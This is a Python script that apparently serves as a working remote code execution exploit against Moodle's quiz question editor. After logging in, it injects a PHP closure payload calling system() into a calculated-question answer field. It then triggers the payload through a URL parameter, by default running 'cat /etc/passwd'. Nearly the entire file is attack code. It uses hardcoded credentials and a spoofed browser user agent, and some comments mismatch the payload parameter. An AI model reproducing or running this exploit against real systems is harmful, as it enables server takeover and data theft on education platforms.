import requests
import re
import sys
import random
import string
import urllib.parse
import time

class MoodleExploit:
    def __init__(self, target_url, username, password, course_id, cm_id, cmd="id"):
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.course_id = str(course_id)
        self.cm_id = str(cm_id)
        self.cmd = cmd
        self.session = requests.Session()
        # Simulate browser behavior to avoid simple anti-bot blocking
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        })

    def log(self, message, level="INFO"):
        print(f"[{level}] {message}")

    def get_random_string(self, length=8):
        return ''.join(random.choices(string.ascii_letters, k=length))

    def login(self):
        self.log("Attempting to authenticate...", "STEP 1")
        
        # 1. Fetch the login page and extract logintoken and initial cookies
        login_url = f"{self.target_url}/login/index.php?loginredirect=1"
        try:
            r = self.session.get(login_url)
            time.sleep(2) # Simulate network latency
            if r.status_code != 200:
                self.log("Failed to access login page", "ERROR")
                return False
            self.log(f"request: GET {login_url} \n X-Request-Id:{r.headers.get('X-Request-Id')} \n")

            
            logintoken_match = re.search(r'name="logintoken" value="([^"]+)"', r.text)
            if not logintoken_match:
                self.log("Could not find logintoken", "ERROR")
                return False
            logintoken = logintoken_match.group(1)
            
            # 2. Send the login request
            post_data = {
                'anchor': '',
                'logintoken': logintoken,
                'username': self.username,
                'password': self.password
            }
            
            # Disable automatic redirects to capture the intermediate testsession
            r = self.session.post(f"{self.target_url}/login/index.php", data=post_data, allow_redirects=False)
            time.sleep(2) # Simulate network latency
            if r.status_code != 303:
                self.log("Login failed or unexpected response code", "ERROR")
                return False
            self.log(f"request: POST {self.target_url}/login/index.php \n X-Request-Id:{r.headers.get('X-Request-Id')} \n")

            # 3. Handle Testsession, matching the Metasploit script step
            redirect_url = r.headers.get('Location', '')
            testsession_match = re.search(r'testsession=(\d+)', redirect_url)
            
            if testsession_match:
                testsession = testsession_match.group(1)
                self.log(f"Got testsession: {testsession}", "DEBUG")
                # Follow the testsession link to complete login
                self.session.get(f"{self.target_url}/login/index.php?testsession={testsession}")
                time.sleep(2) # Simulate network latency
            else:
                # If there is no testsession, follow the redirect directly
                self.session.get(redirect_url)
                time.sleep(2) # Simulate network latency

            # Quickly verify login success by checking for dashboard or user information
            check = self.session.get(f"{self.target_url}/my/")
            time.sleep(2) # Simulate network latency

            if "logout.php" in check.text:
                self.log("Successfully authenticated.", "SUCCESS")
                return True
            else:
                self.log("Authentication failed.", "ERROR")
                return False

        except Exception as e:
            self.log(f"Exception during login: {e}", "ERROR")
            return False

    def get_context_info(self):
        self.log("Retrieving sesskey and context IDs...", "STEP 2")
        url = f"{self.target_url}/mod/quiz/edit.php?cmid={self.cm_id}"
        r = self.session.get(url)
        time.sleep(2) # Simulate network latency
        
        if r.status_code != 200:
            self.log("Failed to access quiz edit page", "ERROR")
            return None

        # Extract sesskey
        sesskey_match = re.search(r'"sesskey":"([^"]+)"', r.text)
        if not sesskey_match:
            # Try another common pattern
            sesskey_match = re.search(r'sesskey=([^"]+)"', r.text)
            
        # Extract courseContextId
        ctx_match = re.search(r'"courseContextId":(\d+)', r.text)
        
        # Extract category
        cat_match = re.search(r';category=(\d+)', r.text)
        if not cat_match:
             # Try to find the default category from options
             cat_match = re.search(r'name="category" value="(\d+)', r.text)

        if sesskey_match and ctx_match and cat_match:
            return {
                'sesskey': sesskey_match.group(1),
                'context_id': ctx_match.group(1),
                'category': cat_match.group(1)
            }
        else:
            self.log("Failed to extract necessary IDs from page.", "ERROR")
            self.log(f"Debug: sesskey found? {bool(sesskey_match)}", "DEBUG")
            return None

    def exploit(self):
        if not self.login():
            return

        ctx_info = self.get_context_info()
        if not ctx_info:
            return

        sesskey = ctx_info['sesskey']
        category_id = ctx_info['category']
        context_id = ctx_info['context_id']
        full_category = f"{category_id},{context_id}"

        self.log("Injecting malicious calculated question...", "STEP 3")

        rand_itemid_q = str(random.randint(424810000, 424819999))
        rand_itemid_g = str(random.randint(940090000, 999999999))
        rand_itemid_f = str(random.randint(738790000, 738799999))
        rand_itemid_h1 = str(random.randint(562440000, 562449999))
        rand_itemid_h2 = str(random.randint(161670000, 161679999))
        rand_penalty = str(random.uniform(0.1333333, 0.7333333))[:9] # Simulate a float value

        # Build malicious payload
        # This payload, (1)->{system($_GET[chr(97)])}, uses PHP closure syntax
        # chr(97) is 'a', which means it executes the command in URL parameter ?a=...
        malicious_answer = '(1)->{system($_GET[chr(98)])}'

        post_data_step1 = {
            'initialcategory': '1',
            'reload': '1',
            'shuffleanswers': '1',
            'answernumbering': 'abc',
            'mform_isexpanded_id_answerhdr': '1',
            'noanswers': '1',
            'nounits': '1',
            'numhints': '2',
            'synchronize': '',
            'wizard': 'datasetdefinitions',
            'id': '',
            'inpopup': '0',
            'cmid': self.cm_id,
            'courseid': self.course_id,
            'returnurl': f"/mod/quiz/edit.php?cmid={self.cm_id}&addonpage=0",
            'mdlscrollto': '0',
            'appendqnumstring': 'addquestion',
            'qtype': 'calculated',
            'makecopy': '0',
            'sesskey': sesskey,
            '_qf__qtype_calculated_edit_form': '1',
            'mform_isexpanded_id_generalheader': '1',
            'mform_isexpanded_id_unithandling': '0', 
            'mform_isexpanded_id_unithdr': '0', 
            'mform_isexpanded_id_multitriesheader': '0', 
            'mform_isexpanded_id_tagsheader': '0',  
            'category': full_category,
            'name': self.get_random_string(),
            'questiontext[text]': '<p>{b}</p>',
            'questiontext[format]': '1',
            'questiontext[itemid]': rand_itemid_q,
            'status': 'ready',
            'defaultmark': '1',
            'generalfeedback[text]': '',
            'generalfeedback[format]': '1',
            'generalfeedback[itemid]': rand_itemid_g,
            'idnumber': '',
            'answer[0]': malicious_answer,  # Core injection part
            'fraction[0]': '1.0',
            'tolerance[0]': '0.01',
            'tolerancetype[0]': '1',
            'correctanswerlength[0]': '2',
            'correctanswerformat[0]': '1',
            'feedback[0][text]': '',
            'feedback[0][format]': '1',
            'feedback[0][itemid]': rand_itemid_f,
            'unitrole': '3',
            'penalty': rand_penalty,
            'hint[0][text]': '',
            'hint[0][format]': '1',
            'hint[0][itemid]': rand_itemid_h1,
            'hint[1][text]': '',
            'hint[1][format]': '1',
            'hint[1][itemid]': rand_itemid_h2,
            'tags': '_qf__force_multiselect_submission',
            'submitbutton': 'Save changes'
        }

        url_step1 = f"{self.target_url}/question/bank/editquestion/question.php"
        r = self.session.post(url_step1, data=post_data_step1, allow_redirects=False)
        time.sleep(1) # Simulate network latency

        self.log(f"request: POST {url_step1} \n X-Request-Id:{r.headers.get('X-Request-Id')} \n")

        if r.status_code != 303:
            self.log(f"{r.status_code}") # 404
            self.log(f"{url_step1}")
            self.log(f"{post_data_step1}")
            self.log("Failed to create question (Step 1).", "ERROR")
            return

        location = r.headers.get('Location', '')
        q_id_match = re.search(r'&id=(\d+)', location)
        if not q_id_match:
            self.log("Could not extract new question ID.", "ERROR")
            return
        
        question_id = q_id_match.group(1)
        self.log(f"Question created with ID: {question_id}", "SUCCESS")

        # --- Step 4: Dataset Definitions (Wizard Step 2) ---
        self.log("Configuring dataset definitions...", "STEP 4")
        
        post_data_step2 = {
            'id': question_id,
            'inpopup': '0',
            'cmid': self.cm_id,
            'courseid': self.course_id,
            'returnurl': f"/mod/quiz/edit.php?cmid={self.cm_id}&addonpage=0",
            'mdlscrollto': '0',
            'appendqnumstring': 'addquestion',
            'category': full_category,
            'wizard': 'datasetitems',
            'sesskey': sesskey,
            '_qf__question_dataset_dependent_definitions_form': '1',
            'dataset[0]': '0',
            'dataset[1]': '0-0-x', # This dataset configuration appears to trigger the earlier injection logic
            'synchronize': '0',
            'submitbutton': 'Next page'
        }
        
        url_step2 = f"{self.target_url}/question/bank/editquestion/question.php?wizardnow=datasetdefinitions"
        r = self.session.post(url_step2, data=post_data_step2, allow_redirects=False)
        time.sleep(1) # Simulate network latency
        if r.status_code != 303:
             self.log("Failed to configure dataset (Step 2).", "ERROR")
             return
        self.log(f"request: POST {url_step2} \n X-Request-Id:{r.headers.get('X-Request-Id')} \n")

        self.log(r.text, "DEBUG")
        
        # --- Step 5: Trigger RCE ---
        self.log(f"Triggering RCE with command: {self.cmd}", "STEP 5")
        
        # Put the command in URL parameter 'a' because the payload uses $_GET['a']
        encoded_cmd = urllib.parse.quote(self.cmd)
        trigger_url = (
            f"{self.target_url}/question/bank/editquestion/question.php?"
            f"id={question_id}&category={category_id}&cmid={self.cm_id}&"
            f"courseid={self.course_id}&wizardnow=datasetitems&"
            f"returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D{self.cm_id}&"
            f"appendqnumstring=addquestion&mdlscrollto=0&b={encoded_cmd}"
        )

        r = self.session.get(trigger_url)
        
        print("\n--- COMMAND OUTPUT (Partial) ---")
        print(r.text[:500]) 
        print("--------------------------------\n")
        self.log("Exploit finished. Check output above.", "INFO")

        self.log(f"request: GET {trigger_url} \n X-Request-Id:{r.headers.get('X-Request-Id')} \n")
        
if __name__ == "__main__":
    # Configuration section
    TARGET = "http://10.0.0.252:8081" # Moodle wwwroot (config.php)
    USER = "admin"                       # User with permission to create questions
    PASS = "Aa!123456"                   # Password
    COURSE_ID = 6                          # Course ID
    CM_ID = 82                             # Course module ID (Quiz ID)
    #COMMAND = "touch /tmp/success"        # Command to execute
    COMMAND = "cat /etc/passwd"

    if len(sys.argv) > 1:
        print("Usage: Modify the script variables directly for POC testing.")
    
    exploit = MoodleExploit(TARGET, USER, PASS, COURSE_ID, CM_ID, COMMAND)
    exploit.exploit()